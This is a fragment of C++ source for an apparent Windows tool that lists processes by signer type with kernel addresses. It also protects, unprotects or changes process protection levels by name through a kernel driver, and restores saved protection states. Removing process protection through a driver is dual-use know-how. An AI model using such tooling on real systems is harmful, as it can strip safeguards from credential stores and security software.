                Utils::GetSignatureLevelAsString(entry.SectionSignatureLevel), entry.SectionSignatureLevel,
                entry.KernelAddress);
                
            std::wcout << buffer;
            std::wcout << Utils::ProcessColors::RESET; // Reset color after each line
        }
    }
    
    if (!foundAny) {
        std::wcout << L"\nNo processes found with signer type: " << signerName << L"\n";
        return false;
    }
    
    std::wcout << Utils::ProcessColors::GREEN;
    std::wcout << L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";
    std::wcout << Utils::ProcessColors::RESET;
    
    return true;
}
// ============================================================================
// PROCESS NAME-BASED OPERATIONS
// ============================================================================

bool Controller::ProtectProcessByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return ProtectProcess(match->Pid, protectionLevel, signerType);
}

bool Controller::UnprotectProcessByName(const std::wstring& processName) noexcept {
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return UnprotectProcess(match->Pid);
}

bool Controller::SetProcessProtectionByName(const std::wstring& processName, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return SetProcessProtection(match->Pid, protectionLevel, signerType);
}

// Session state restoration operations
bool Controller::RestoreProtectionBySigner(const std::wstring& signerName) noexcept
{
    if (!BeginDriverSession()) {
        EndDriverSession(true);
        return false;
    }
    
    bool result = m_sessionMgr.RestoreBySigner(signerName, this);
    
    EndDriverSession(true);
    return result;
}

bool Controller::RestoreAllProtection() noexcept
{
    if (!BeginDriverSession()) {
        EndDriverSession(true);
        return false;
    }
    
    bool result = m_sessionMgr.RestoreAll(this);
    
    EndDriverSession(true);
    return result;
}

void Controller::ShowSessionHistory() noexcept
{
    m_sessionMgr.ShowHistory();
}